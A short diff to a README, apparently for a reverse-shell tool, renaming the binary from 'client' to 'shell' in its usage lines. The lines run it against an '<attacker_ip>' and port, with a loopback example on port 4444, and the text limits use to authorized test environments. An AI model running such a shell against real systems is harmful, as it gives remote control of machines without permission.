@@ -117,13 +117,13 @@ Clean the project completely and rebuild it from scratch.
 The resulting binary can be executed with an IP address and listening port:
 
 ```bash
-./client <attacker_ip> <port>
+./shell <attacker_ip> <port>
 ```
 
 ### Example
 
 ```bash
-./client 127.0.0.1 4444
+./shell 127.0.0.1 4444
 ```
 
 Use this only within an authorized test environment.
